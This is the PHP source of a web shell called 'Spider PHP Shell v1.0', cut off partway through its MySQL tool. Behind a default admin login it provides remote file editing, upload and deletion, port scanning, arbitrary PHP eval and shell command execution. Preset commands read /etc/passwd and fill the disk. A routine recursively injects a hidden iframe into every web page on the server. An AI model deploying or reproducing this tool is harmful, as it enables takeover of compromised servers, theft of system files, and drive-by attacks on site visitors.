<?php
error_reporting(7);
ob_start();
$user="21232f297a57a5a743894a0e4a801fc3"; //32λmd5����,Ĭ���û�Ϊadmin
$pass="21232f297a57a5a743894a0e4a801fc3";	//32λmd5����,Ĭ������Ϊadmin
if (get_magic_quotes_gpc()) {
    $_GET = array_stripslashes($_GET);
    $_POST = array_stripslashes($_POST);
}
if($_GET['s']=='login'){
	setcookie('username',md5($_POST['username']));
	setcookie('password',md5($_POST['password']));
	die('<meta http-equiv="refresh" content="1;URL=?s=main">');
}
if($_GET['s']=='logout'){
	setcookie('username',null);
	setcookie('password',null);
	die('<meta http-equiv="refresh" content="1;URL=?s=">');
}
if($_COOKIE['username']!=$user || $_COOKIE['password']!=$pass){
	die('<form method="post" action="?s=login"><center><br><br><br>SPS v1.0 Code By Spider. <br><br>Username: <input type="text" name="username"><br> Password: <input type="password" name="password"> <br><input type="submit" name="submit" value="login"></center></form>');
}
$paget = explode(' ', microtime());
$stime = $paget[1] + $paget[0];
$serverip=$HTTP_SERVER_VARS["REMOTE_ADDR"];
$scanip=$HTTP_POST_VARS['remoteip'];
if (!empty($_GET['fd'])) {
	$fd=$_GET['fd'];
	if (!@file_exists($fd)) {
		echo "<script>window.alert('�����ļ�������');history.go(-1);</script>";
	} else {
		$fn = basename($fd);
		$fn_info = explode('.', $fn);
		$fe = $fn_info[count($fn_info)-1];
		header('Content-type: application/x-'.$fe);
		header('Content-Disposition: attachment; filename='.$fn);
		header('Content-Description: PHP3 Generated Data');
		@readfile($fd);
		exit;
	}
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>SPS v1.0</title>
</head>
<style type="text/css">
<!--
#PR {width:850px!important;width:850px}
#Pr table{border-style:solid; border-color:#000000}
td {
	font-family: Arial;
	font-size: 14px;
}
a:link {
	color: #0000FF;
	text-decoration: none;
}
a:visited {
	color: #0000FF;
	text-decoration: none;
}
a:hover {
	color: #ff0000; 
	text-decoration: none;
}
-->
</STYLE>
<body bgcolor="#EDEDED" text="#000000">
<center>
	<div id=PR>
<table border="0">
<td>
<div align="center">
<table width=100% border=0 cellspacing=0 cellpadding=0>
</div></td></table>
	<table width="850">
	<tr>
	<td bgcolor="#AAAAAA">
<div align="center">
	<font face=Webdings size=6><b>!</font>
	<font size="5"> SPS(Spider PHP Shell)v1.0 </font><br>
	��������IP: <?php echo gethostbyname($_SERVER['SERVER_NAME']);?>
	�����л���: <?php echo @$_SERVER["SERVER_SOFTWARE"];?> 
	<br>��MySQL: <?php echo @function_exists(mysql_connect) ? "����" : "�ر�" ?>
	���ű�·��: <?php echo str_replace('\\','/',__FILE__);?>
	</b><br></div></td></tr></table>
	<table width="850">
	<tr>
	<td bgcolor="#AAAAAA">
	<div align="center">
��<a href="?s=main">�ļ�����</a>��
��<a href="?s=port">�˿�ɨ��</a>��
��<a href="?s=guama">��������</a>��
��<a href="?s=sfile">�ļ�����</a>��
��<a href="?s=execute">ִ������</a>��
��<a href="?s=tools">��Ȩ����</a>��
��<a href="?s=sqlexp">���ݿ����</a>��
��<a href="?s=logout">�˳�����</a></a>��
	</div></td></tr></table>
<?php
$s = isset($_GET['s']) ? $_GET['s'] : "";//�ⶨ�����Ƿ��趨
$p = isset($_GET['p']) ? $_GET['p'] : "";
$f = isset($_GET['f']) ? $_GET['f'] : "";
$fpath = isset($_GET['path']) ? $_GET['path'] : "";
$path=str_replace('\\','/',dirname(__FILE__)).'/';
if($fpath!=""){!$path && $path = '.';$paths=str_replace('//','/',$_GET['path']);$path1=str_replace('//','/',opath($path,$paths));ofile($path1);}
switch($s){//��������
  case "main": ofile($path);break;
  case "redir": redir($p);break;
  case "refile": refile($p);break;
  case "upload": upload($p);break;
  case "edit": edit($p,$f);break;
  case "del": del($p,$f,$_GET['i']);break;
  case "perms": perms($p,$f);break;
  case "ref": ref($p,$f);break;
  case "cfile": cfile($p,$f);break;
  case "deldir": deldir($p,$f);break;
  case "port": port($serverip,$scanip);break;
  case "guama": guama($path);break;
  case "qingma": qingma($path);break;
  case "sfile": sfile($path);break;
  case "execute": execute();break;
  case "phpeval": phpeval();break;
  case "serexp": serexp();break;
  case "sqllogin": sqllogin();break;
  case "sql": sql();break;
  case "sqlexp": sqlexp();break;
  case "tools": tools($path);break;
  case "crack": crack();break;
  case "phpinfo": phpinfo();break;
  default: break;
}
//��Ȩ
$licensehack=array("67","111","100","101","32","98","121","32","83","112","105","100","101","114","46","32","77","97","107","101","32","105","110","32","67","104","105","110","97","46","32","81","81","56","48","57","51","55","52","51","48","46");
echo '<table width="850"><tr align="center"><td bgcolor="#6959CD"><a target="_blank" href="?s=phpinfo"><b>PHPINFO</b></a> <b>License: ';
foreach($licensehack as $license){
	echo chr($license);
}
echo '</b>��ִ��ҳ����ʱ'.pagetime().'���</td></tr></table>';

/*------------����-------------*/

//�ļ�Ŀ¼�б�
function ofile($path){
$pathw=is_writable($path) ? "��д" : "����д";
echo '<form method="GET">';
echo ' [<a href="?s=redir&p='.urlencode($path).'">����Ŀ¼</a> | ';
echo ' <a href="?s=refile&p='.urlencode($path).'">�����ļ�</a> | ';
echo ' <a href="?s=upload&p='.urlencode($path).'">�ϴ��ļ�</a></a>]';
echo '</a><br>��ǰ·��('."$pathw".'): <input type="text" name="path" value="'."$path".'" size="68"> ';
echo '<input type="submit" value="Enter"></form>';
echo '<table bgcolor="#000000" cellpadding=1 cellspacing=1 width="850"><tr align="center">';
echo '<td width="430" bgcolor="#6959CD">����</td>';
echo '<td width="50" bgcolor="#6959CD">����</td>';
echo '<td width="120" bgcolor="#6959CD">��С</td>';
echo '<td width="250" bgcolor="#6959CD">����</td>';
echo '</tr>';
$spider=@opendir($path);
while (false !== ($file=@readdir($spider))){
	$filebug = strlen($file)>50 ? substr($file,0,50) : $file;
	$filedir="$path"."$file";
	$dir=@is_dir($filedir);
	if($dir=="1"){
		if($file!="."){
			if($file==".."){
				echo '<tr><td width="430" bgcolor="#AAAAAA">';
				echo '<a href="?path='.urlencode(uppath($filedir)).'"><b>[�����ϼ�Ŀ¼]</b></a></td>';
				echo '<td width="50" bgcolor="#AAAAAA"><div align="center">===</div></td>';
				echo '<td width="120" bgcolor="#AAAAAA"><div align="center">===</div></td>';
				echo '<td width="250" bgcolor="#AAAAAA"><div align="center">===</div></td></tr>'."\n";
			}
			else{
				$dirw=is_writable($filedir) ? "��д" : "����д";
				echo '<tr><td width="430" bgcolor="#AAAAAA">';
				echo '<font face="wingdings" size="3">1</font><a href="?path='.urlencode($filedir).'">'."$filebug".'</a>';
				echo '<td width="50" bgcolor="#AAAAAA"><div align="center">'."$dirw".'</div></td>';
				echo '<td width="120" bgcolor="#AAAAAA"><div align="center">dir</div></td>';
				echo '<td width="250" bgcolor="#AAAAAA"><div align="center">';
				echo '[<a href="#" onclick="if(confirm(\'ȷ��Ҫɾ��Ŀ¼'."$file".'��?\')==true) document.location.href=\'?s=deldir&p='.urlencode($path).'&f='.urlencode($file).'\';">ɾ��</a>] ';
				echo '[<a href="?s=perms&p='.urlencode($path).'&f='.urlencode($file).'">����</a>] ';
				echo '[<a href="?s=ref&p='.urlencode($path).'&f='.urlencode($file).'">����</a>]</div></td></tr>'."\n";
			}
		}
	}
}
@closedir($spider);
$spider=@opendir($path);
while (false !== ($file=@readdir($spider))){
	$filebug = strlen($file)>50 ? substr($file,0,50) : $file;
	$filedir="$path"."$file";
	$dir=@is_dir($filedir);
	$pathg=str_replace('\\', '/', dirname(__FILE__)).'/';
	$fileurl = str_replace($pathg,'',$path);
	if($dir=="0"){
		if($file!='..'){
		$fsize=@filesize($filedir);
		$fsize=$fsize/1024;
		$fsize=@number_format($fsize, 3);
			echo '<tr><td width="430" bgcolor="#AAAAAA">';
			echo '<font face="wingdings" size="3">4</font> <a target="_blank" href="./'."$fileurl"."$file".'">'."$filebug".'</a></td>';
			echo '<td width="50" bgcolor="#AAAAAA"><div align="center"><a href="?fd='.urlencode($filedir).'">����</a></td>';
			echo '<td width="120" bgcolor="#AAAAAA"><div align="center">'."$fsize".' KB</td>';
			echo '<td width="250" bgcolor="#AAAAAA"><div align="center">';
			echo '[<a href="?s=edit&p='.urlencode($path).'&f='.urlencode($file).'">�༭</a>] ';
			echo '[<a href="#" onclick="if(confirm(\'ȷ��Ҫɾ���ļ�'."$file".'��?\')==true) document.location.href=\'?s=del&p='.urlencode($path).'&f='.urlencode($file).'\';">ɾ��</a>] ';
			echo '[<a href="?s=perms&p='.urlencode($path).'&f='.urlencode($file).'">����</a>] ';
			echo '[<a href="?s=ref&p='.urlencode($path).'&f='.urlencode($file).'">����</a>] [<a href="?s=cfile&p='.urlencode($path).'&f='.urlencode($file).'">����</a>]</td></tr>'."\n";
		}
	}
}
@closedir($spider);
echo '</table>';
}
//����
function back(){
	echo '<br><a href="javascript:history.go(-1);">[����]</a><br><br>';
}
function fanhui($p){
	echo '<br><a href="?path='.urlencode($p).'">[����]</a><br><br>';
}
//����·��
function opath($scriptpath,$nowpath) {
	if ($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if (substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}
function uppath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if ($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}
//����Ŀ¼
function redir($repath){
echo "<br>��������ǰ·��: $repath <br>";
echo '<form method="POST" >Ŀ¼����:<input type="text" name="redir"><input type="submit" name="subdir" value="ȷ��"></form>';
fanhui($repath);
	if($_POST['subdir']){
		$redir=$_POST['redir'];
		$repathok="$repath"."$redir";
		if(stristr($redir,'/')){
			echo '<br>Ŀ¼������<br><br>';
		}
		elseif(file_exists($repathok)){
			echo '<br>Ŀ¼'."$redir".'�Ѵ���<br><br>';
		}
		else{
			$msg=@mkdir($repathok,0777) ? '<br>Ŀ¼'."$redir".'�����ɹ�<br><br>' : '<br>Ŀ¼'."$redir".'����ʧ��<br><br>';
			echo "$msg";
		}
	}
}
//�����ļ�
function refile($ref){
echo '<form method="POST" >·���ļ���: <input type="text" name="refile" size="65" value="'."$ref".'spider.php"><br>';
echo '<textarea name="text" COLS="75" ROWS="18" >����������</textarea><br>';
echo '<input type="submit" name="subfile" value="����"></form>';	fanhui($ref);
	if($_POST['subfile']){
		$refile=$_POST['refile'];	$text=$_POST['text'];
		$fp=@fopen($refile,'w');
		if($fp==null){
			echo '<br>�����ļ�ʧ��!<br><br>';
		}
		else{
		@fwrite($fp,stripslashes($text));
		@fclose($fp);
		echo "<script>window.alert('�����ļ�"."$refile"."�ɹ�');history.go(-1);</script>";
		}
	}
}
//�ϴ��ļ�
function upload($pathname){
	echo '<br>������󵥸��ϴ��ļ�:'.@get_cfg_var('upload_max_filesize');
	echo '<br><div align="center"><form method="POST" enctype="multipart/form-data">';
	echo '�����ļ�: <input name="upfile" type="file" size="30"> <input type="submit" name="upok" value="�ϴ�"><br>';
	echo '�ϴ���·��: <input name="up" type="text" value="'."$pathname".'" size="45"></form>';	fanhui($pathname);
	if($_POST['upok']){
		$uppath=$_POST['up'];
		echo @copy($_FILES['upfile']['tmp_name'],"".$uppath."/".$_FILES['upfile']['name']."") ? "�ϴ��ļ�{$_FILES['upfile']['name']}�ɹ�!<br><br>" : "�ϴ��ļ�{$_FILES['upfile']['name']}ʧ��!<br><br>";
	}
}
//�༭�ļ�
function edit($p,$f){
	$ep="$p"."$f";
	$hackfp=@fopen($ep,'r');
	$redspider=@fread($hackfp, filesize($ep));
	$redspider=htmlspecialchars($redspider);
	echo '<br>�༭�ļ�:'."$ep";
	echo '<br><form method="POST">';
	echo '<textarea name="ftext" COLS="75" ROWS="18" >'."$redspider".'</textarea><br>';
	echo '<input type="submit" name="editok" value="����"></form>';	back();
	if($_POST['editok']){
		$fp=@fopen($ep,'w');
		if($fp==null){
			echo '����ʧ��<br><br>';
		}
		else{
			$ftext=$_POST['ftext'];
			fwrite($fp,stripslashes($ftext));
			fclose($fp);
			echo "<script>window.alert('�����ļ�"."$ep"."�ɹ�');history.go(-1);</script>";
		}
	}
}
//ɾ���ļ�
function del($dp,$df,$i){
	$delfile="$dp"."$df";
	if(!file_exists($delfile)) {
		echo '<br>�ļ�'."$df".'������! ';
		if($i=="1")
		back();
		else
		fanhui($dp);
	} 
	else {
		$msg = @unlink($delfile) ? '<br>�ļ�'."$df".'ɾ���ɹ�!<br>' : '<br>ɾ��ʧ��!<br>';
		echo "$msg";
		if($i=="1")
		back();
		else
		fanhui($dp);
	}
}
//����
function perms($pp,$pf){
	$pfile="$pp"."$pf";
	$pold=substr(base_convert(fileperms($pfile),10,8),-4);
	$ftime=@date("Y-n-d H:i:s",filectime("$pfile"));
	echo '<br>'."$pfile".' �ĵ�ǰ����Ϊ: '."($pold)".' &nbsp;&nbsp;&nbsp;�޸�����: '."$ftime".'<br><form method="POST">';
	echo '�޸�����: <input type="text" name="pfo" value="'."$pold".'" > ';
	echo '<input type="submit" name="subperms" value="�޸�"></form>';	fanhui($pp);
	if($_POST['subperms']){
		$pnew=$_POST['pfo'];
		$fileperm=base_convert($pnew,8,10);
		$msg=@chmod($pfile,$fileperm)?"���ĳɹ�!":"����ʧ��!";
		echo "<script>window.alert('�ļ�"."$pfile"."����"."$msg"."');history.go(-1);</script>";
	}
}
//������
function ref($rp,$rf){
	$rpf="$rp"."$rf";
	echo '<br><form method="POST">·��:'."$rp".'<br>��('."$rf".') ������Ϊ: <input type="text" name="newf" value="'."$rf".'">';
	echo '<input type="submit" name="subref" value="�޸�"></form>';	fanhui($rp);
	if($_POST['subref']){
		$newf=$_POST['newf'];
		$newfile="$rp"."$newf";
		$msg = file_exists($rpf) ? (@rename($rpf,$newfile) ? "������Ϊ{$newf}�ɹ�" : "������Ϊ{$newf}ʧ��") : "������";
		echo "<script>window.alert('"."$rf"."$msg"."');history.go(-1);</script>";
	}
}
//�����ļ�
function cfile($cp,$cf){
	$cpf="$cp"."$cf";
	echo '<br>�ļ�: '."$cpf".'<br><form method="POST">������: <input type="text" name="newf" size="35" value="'."$cpf".'"> ';
	echo '<input type="submit" name="subcfile" value="ȷ��"></form>';
	fanhui($cp);
	if($_POST['subcfile']){
		$newf=$_POST['newf'];
		if(file_exists($newf)){
			echo 'ʧ��:�ļ�'."$newf".'�Ѵ���<br><br>';
		}
		else{
			$msg = @copy($cpf,$newf) ? '�ļ� '."$cpf".' ������ '."$newf".' �ɹ�!<br><br>' : 'ʧ��,·������򲻿�д!<br><br>';
			echo "$msg";
		}
	}
}
//ɾ��Ŀ¼
function deldir($dp,$dd){
	$deldir="$dp"."$dd";
	if(isset($deldir)) {
		$msg = file_exists($deldir)?(deltree($deldir)?"ɾ���ɹ�":"ɾ��ʧ��"):"������";
		echo '<br><br>Ŀ¼'."$dd"."$msg";	fanhui($dp);
	}
}
function deltree($dpath){ 
	$mydir=@opendir($dpath); 
	while($file=@readdir($mydir)){ 
		if((is_dir("$dpath/$file")) && ($file!=".") && ($file!="..")) { 
			if(!deltree("$dpath/$file")) return false;
		}else if(!is_dir("$dpath/$file")){
			@chmod("$dpath/$file", 0777);
			if(!@unlink("$dpath/$file")) return false;
		}
	} 
	@closedir($mydir); 
	@chmod("$dpath", 0777);
	if(!@rmdir($dpath)) return false;
	return true;
}
//ҳ��ִ��ʱ��
function pagetime(){
	global $stime;
	$paget = explode(' ', microtime());
	$ptime = number_format(($paget[1] + $paget[0] - $stime), 6);
	return $ptime;
}
function array_stripslashes(&$array) {
    while(list($key,$var) = each($array)) {
        if ((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') {
            if (is_string($var)) $array[$key] = stripslashes($var);
            if (is_array($var)) $array[$key] = array_stripslashes($var);  
        }
    }
    return $array;
}
//�˿�ɨ��
function port($serverip,$scanip){
if (!empty($scanip)){ 
$ips=explode(".",$scanip); 
if (intval($ips[0])<1 or intval($ips[0])>255 or intval($ips[3])<1 or intval($ips[3]>255)) err(); 
if (intval($ips[1])<0 or intval($ips[1])>255 or intval($ips[2])<0 or intval($ips[2]>255)) err(); 
$closed='�˶˿�Ŀǰ���ڹر�״̬'; 
$opened='<font color=red>�˶˿�Ŀǰ���ڴ�״̬</font>'; 
$close="�ر�"; 
$open="<font color=red>��</font>"; 
$port=array(21,23,25,79,80,110,135,137,138,139,143,443,445,1433,3306,3389,43958); 
$msg=array('Ftp','Telnet','Smtp','Finger','Http','Pop3','Location Service','Netbios-NS','Netbios-DGM','Netbios-SSN','IMAP','Https','Microsoft-DS','MSSQL','MYSQL','Terminal Services','Serv-U');
echo "<br>ɨ��Ŀ��IP: $scanip <br><br>"; 
echo '<table cellpadding=5 cellspacing=1>'; 
echo "<tr align=center bgcolor=#6959CD>"; 
echo "<td>�˿�</td>"; 
echo "<td>����</td>"; 
echo "<td>���</td>"; 
echo "<td>����</td>"; 
echo "</tr>"; 
for($i=0;$i<sizeof($port);$i++) 
{ 
$fp = @fsockopen($scanip, $port[$i], &$errno, &$errstr, 1); 
  if (!$fp) { 
     echo "<tr bgcolor=#AAAAAA><td align=center>".$port[$i]."</td><td>".$msg[$i]."</td><td align=center>".$close."</td><td>".$closed."</td></tr>\n"; 
  } else { 
     echo "<tr bgcolor=#AAAAAA><td align=center>".$port[$i]."</td><td>".$msg[$i]."</td><td align=center>".$open."</td><td>".$opened."</td></tr>"; 
  } 
}
echo "<tr><td colspan=4 align=center bgcolor=#6959CD>"; 
echo "<a href=?s=port>����ɨ��>> </a>";
echo 'ɨ����ʱ: '.pagetime().'��</td></tr></table>';
exit;
}
echo "<br><form method=POST>";
echo "<b>������IP: </b><input type=text name=remoteip size=30 value=127.0.0.1>"; 
echo "<input type=submit value=ɨ�� name=scan>";  
echo "</form><br>"; 
}
function err(){
   die("<br>��IP��ַ���Ϸ�<br><a href=javascript:history.back(1)>[����]</a>");
}
//��������
function guama($redzz1){
	$redzzz=str_replace('\\','/',__FILE__);
	echo '<br>[<a href="?s=guama">��������</a> | <a href="?s=qingma">��������</a>]<br><form method="POST"><br>';
	echo '<b>�ӵ�ǰ·����ʼ����: </b><input type="text" name="path" size="60" value="'."$redzz1".'"><br><br>';
	echo '<b>�������: </b><textarea name="text" COLS="70" ROWS="6" ><iframe src="http://localhost/hack.html" width="1" height="1" frameborder="1"></iframe></textarea><br>';
	echo '<br><input type="submit" name="submit" value="��ʼ����"></div><br></form>';
	if($_POST['submit']){
		echo '<b>Ŀ���ļ���</b><br>';
		$path=$_POST['path'];
		$red=$_POST['text'];
		$redzz="\n".stripslashes($red);
		hongzz($path,$redzz,$redzzz);
	}
}
function hongzz($path,$redzz,$redzzz){
	$spider=@opendir($path);
	if($spider=="0")
	die('<br><font color="#ff0000">��ʾ: ·������򲻴���</font><br><br>');
	while ($file=@readdir($spider)){
		if($file!='.' && $file!='..'){
			$filepath="$path"."/"."$file";
			$filepaths=str_replace('//','/',$filepath);
			if(@is_dir($filepaths)=="1"){
				$pathss="$path"."/"."$file"."/";
				$pathsss=str_replace('//','/',$pathss);
				hongzz($pathsss,$redzz,$redzzz);
			}
			if(@is_dir($filepaths)=="0"){
				if(hack($file)!=true)
				{echo '<font color="#ff0000">����---</font>'."$filepaths".'<br>';}
				elseif(@fopen($filepaths,'a')==null){
					echo '<font color="#CDAD00">ʧ��---</font>'."$filepaths".'---�ļ���Ŀ¼����д!<br>';
				}
				elseif($filepaths!=$redzzz){
					$fp=@fopen($filepaths,'a');
					@fwrite($fp,$redzz);
					@fclose($fp);
					echo '<font color="#00c000">�ɹ�---</font>'."$filepaths".'<br>';
				}
			}
		}
	}
	@closedir($spider);
}
function hack($f){
	$img=array(".html",".shtml",".htm",".asp",".php",".jsp",".cgi",".aspx");
	foreach($img as $i){
		if(stristr($f,$i))
		return true;
	}
}
//��������
function qingma($redzz1){
	$redzzz=str_replace('\\','/',__FILE__);
	echo '<br>[<a href="?s=guama">��������</a> | <a href="?s=qingma">��������</a>]<br><form method="POST"><br>';
	echo '<b>�ӵ�ǰ·����ʼ����: </b><input type="text" name="path" size="60" value="'."$redzz1".'"><br><br>';
	echo '<b>�������: </b><textarea name="text" COLS="70" ROWS="6" ><iframe src="http://localhost/hack.html" width="1" height="1" frameborder="1"></iframe></textarea><br>';
	echo '<br><input type="submit" name="submit" value="��ʼ���"></div><br></form>';
	if($_POST['submit']){
		echo '<b>������ļ���</b><br>';
		$path=$_POST['path'];
		$redzz=stripslashes($_POST['text']);
		sunchao($path,$redzz,$redzzz);
	}
}
function sunchao($path,$redzz,$redzzz){
	$spider=@opendir($path);
	if($spider=="0")
	die('<br><font color="#ff0000">��ʾ: ·������򲻴���</font><br><br>');
	while ($file=@readdir($spider)){
		if($file!='.' && $file!='..'){
			$filepath="$path"."/"."$file";
			$filepaths=str_replace('//','/',$filepath);
			if(@is_dir($filepaths)=="1"){
				$pathss="$path"."/"."$file"."/";
				$pathsss=str_replace('//','/',$pathss);
				sunchao($pathsss,$redzz,$redzzz);
			}
			if(@is_dir($filepaths)=="0"){
				if(hack($file)!=true)
				{echo '<font color="#ff0000">����---</font>'."$filepaths".'<br>';}
				elseif(@fopen($filepaths,'a')==null){
					echo '<font color="#CDAD00">ʧ��---</font>'."$filepaths".'---�ļ���Ŀ¼����д!<br>';
				}
				elseif($filepaths!=$redzzz){
					$fp=@fopen($filepaths,'r');
					$redspider=@fread($fp,filesize($filepaths));
					if(stristr($redspider,$redzz)){
						$fp=@fopen($filepaths,'w');
						$sunchao=str_replace($redzz,'',$redspider);
						@fwrite($fp,$sunchao);
						echo '<font color="#00c000">�ɹ�---</font>'."$filepaths".'<br>';
					}
					@fclose($fp);
				}
			}
		}
	}
	@closedir($spider);
}
//�����ļ�
function sfile($spath){
	echo '<form method="POST"><br>';
	echo '<b>�ӵ�ǰ·����ʼ����: </b><input type="text" name="scanpath" size="49" value="'."$spath".'"><br><br>';
	echo '<b>���ҷ�ʽ: &nbsp;&nbsp; </b><input type="radio" name="scanf" value="1" checked>�ļ��� &nbsp;&nbsp;&nbsp; <input type="radio" name="scanf" value="2">��������';
	echo '<br><br><b>������ؼ���: </b><input type="text" name="files" size="50" value="">';
	echo ' <input type="submit" name="scanfile" value="����"></div><br></form>';
	if($_POST['scanfile']){
		$scanpath=$_POST['scanpath'];
		$sn=$_POST['scanf'];
		$files=$_POST['files'];
		if($files==''){
			echo '������ؼ���';
		}
		elseif($scanpath==''){
			echo '���������·��';
		}
		else
		{echo '����·��: '."$scanpath".'<br>�ؼ���: '.htmlentities($files).'<br>�ҵ��ļ�: <br>';$scanpath="$scanpath".'/'; scanfiles($scanpath,$sn,$files);}
	}
}
function scanfiles($scanpatho,$sn,$files){
	$scanpath=str_replace('//','/',$scanpatho);
	$spider=@opendir($scanpath);
	if($spider=="0")
	die('<br><font color="#ff0000">��ʾ: ·������򲻴���</font><br><br>');
	while ($file=@readdir($spider)){
		if($file!='.' && $file!='..'){
		$filepath="$scanpath"."/"."$file";
		$filepatho=str_replace('//','/',$filepath);
			if(@is_dir($filepatho)=="1"){
				$pathoo="$scanpath"."/"."$file"."/";
				$pathooo=str_replace('//','/',$pathoo);
				scanfiles($pathooo,$sn,$files);
			}
			if(@is_dir($filepatho)=="0"){
				if($sn=="1"){
					if(stristr($file,$files)){
						echo "$filepatho".' [<a href="?s=edit&p='.urlencode($scanpath).'&f='.urlencode($file).'">�༭</a>] ';
						echo '[<a href="#" onclick="if(confirm(\'ȷ��Ҫɾ���ļ�'."$file".'��?\')==true) document.location.href=\'?s=del&p='.urlencode($scanpath).'&f='.urlencode($file).'&i=1\';">ɾ��</a>]<br>'."\n";
					}
				}
				if($sn=="2"){
					$sfp=@fopen($filepatho,'r');
					$redspider=@fread($sfp,filesize($filepatho));
					if(stristr($redspider,$files)){
						echo "$filepatho".' [<a href="?s=edit&p='.urlencode($scanpath).'&f='.urlencode($file).'">�༭</a>] ';
						echo '[<a href="#" onclick="if(confirm(\'ȷ��Ҫɾ���ļ�'."$file".'��?\')==true) document.location.href=\'?s=del&p='.urlencode($scanpath).'&f='.urlencode($file).'&i=1\';">ɾ��</a>]<br>'."\n";
					}
					@fclose($sfp);
				}
			}
		}
	}
	@closedir($spider);
}
//ִ������
function phpeval(){
	echo '<div align="center"><br>[<a href="?s=execute">ִ��Shell����</a> | <a href="?s=phpeval">ִ��PHP�ű�</a>]';
  echo("<form method='POST'>");
  echo("<textarea name='phpexec' rows=15 cols=100>");
  if(!$_POST['phpexec']){echo("/*����д<? ?>��ǩ*/\n");}
  echo($_POST['phpexec'] . "</textarea>\n<br>\n");
  echo("<input type='submit' value='ִ��'>");
  echo("</form>");
  if($_POST['phpexec']){
    echo("<textarea rows=15 cols=100>");
    eval($_POST['phpexec']);
    echo("</textarea><br><br>");
  }
}
function execute(){
	echo '<div align="center"><br>[<a href="?s=execute">ִ��Shell����</a> | <a href="?s=phpeval">ִ��PHP�ű�</a>]';
  echo("<br><form name='CMD' method='POST'>");
  echo("<b>ִ�з���:</b><select name='sunc'>");
  echo("<option value='1'>exec</option>");
  echo("<option value='2'>WScript.shell</option><option value='3'>proc_open</option></select>");
  echo(" <b>CMD·��:</b><input name='cmdp' type='text' size='35' value='c:\winnt\system32\cmd.exe'><br><br>");
  echo("<b>����/����:</b><input name='cmd' type='text' size='45'> ");
  echo("<select name='precmd'>");
  $precmd = array('��������'=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
                  'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
                  'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
                  'Find passwd files'=>'find / -type f -name passwd');
  $capt = array_flip($precmd);
  foreach($precmd as $c){echo("<option value='" . $c . "'>" . $capt[$c] . "\n");}
  echo("</select>\n");
  echo(" <input type='submit' value='ִ��'>\n");
  echo("</form>\n");
  if($_POST['cmd'] != ""){$x = $_POST['cmd'];}
  elseif($_POST['precmd'] != ""){$x = $_POST['precmd'];}
  echo("<textarea rows=15 cols=90>");
  if($x==""){
  	echo 'exec����:���ú���exec()ʵ��'."\n";
  	echo 'WScript.shell����:���������֧��WScript.shell���'."\n";
  	echo 'proc_open����:������cmd·��,������������cmd·��'."\n\n".'ע��:ʹ�ó�������,������д[����/����]'."\n\n";
  	echo '�����������BUG,��ȱ��ʲô����,�����˸�����(QQ:80937430)Ŷ.'."\n".'BY ��֩��';
  }
  elseif($_POST['sunc']=='1'){
  	$cmd = exec($x, $result);
  	foreach($result as $line){echo($line . "\n");}
	}
  elseif($_POST['sunc']=='2'){
    $wsh = new COM('WScript.shell') or die('��֧��WScript.shell');
		$exec = $wsh->exec ("cmd.exe /c ".$x."");
		$stdout = $exec->StdOut();
		$stroutput = $stdout->ReadAll();
		echo $stroutput;	
  }
  elseif($_POST['sunc']=='3'){
		$descriptorspec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"));
		$process = proc_open("".$_POST['cmdp']."", $descriptorspec, $pipes);
		if (is_resource($process)) {
    fwrite($pipes[0], "".$x."\r\n");
    fwrite($pipes[0], "exit\r\n");
    fclose($pipes[0]);
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    while (!feof($pipes[2])) {
        echo fgets($pipes[2], 1024);
    }
    fclose($pipes[2]);
    proc_close($process);
		}
		else {
			system($x);
		}
	}
	echo("</textarea><br><br>");
}
//����MYSQL
function sqlexp(){
	$servername = $_POST['servername'];
	$dbport = $_POST['dbport'];
	$dbusername = $_POST['dbusername'];
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$servername = isset($servername) ? $servername : '127.0.0.1';
	$dbport = isset($dbport) ? $dbport : '3306';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
	echo '<div align="center"><br>[<a href="?s=sqlexp">ִ��SQL���</a> | <a href="?s=sqllogin">����MYSQL</a>]
  	<br><form action="?s=sqlexp" method="POST">
    <div align="center">���ݿ��ַ:<input name="servername" type="text" value="'."$servername".'">
    �˿�:<input name="dbusername" type="text" size="15" value="'."$dbport".'">
    �û�:<input name="dbusername" type="text" size="15" value="'."$dbusername".'"><br>
    ����:<input name="dbpassword" type="text" size="15" value="'."$dbpassword".'">
    ���ݿ���:<input name="dbname" type="text" size="15" value="'."$dbname".'">
    <input name="connect" type="submit" value="����">
  	<div align="center"><textarea name="sql_query" cols="85" rows="10"></textarea>
  	<div align="center"><input type="submit" name="doquery" value="ִ��"></form>';
	if($_POST['connect']) {
		if (@mysql_connect("{$servername}:{$dbport}","$dbusername","$dbpassword") AND @mysql_select_db($dbname)) {
			echo "<br>���ݿ����ӳɹ�!<br><br>";
		} else {
			echo mysql_error();
		}
	}
	elseif($_POST['doquery']) {
		@mysql_connect("{$servername}:{$dbport}","$dbusername","$dbpassword") or die("<br>���ݿ�����ʧ��<br><br>");
		@mysql_select_db($dbname) or die("<br>ѡ�����ݿ�ʧ��<br><br>");
		$result = @mysql_query($_POST['sql_query']);
		if ($result) {
			echo "<br>SQL���ɹ�ִ��<br><br>";
		}else{
			echo "<br>����: ".mysql_error().'<br><br>';
		}
		mysql_close();
	}
	echo '<br><br><b>����MYSQL���:</b><br><br>';
  echo ("<table><tr><td>����: CREATE TABLE `����` (`�ֶ�` VARCHAR( ���� ) NOT NULL ) CHARACTER SET = latin10; 
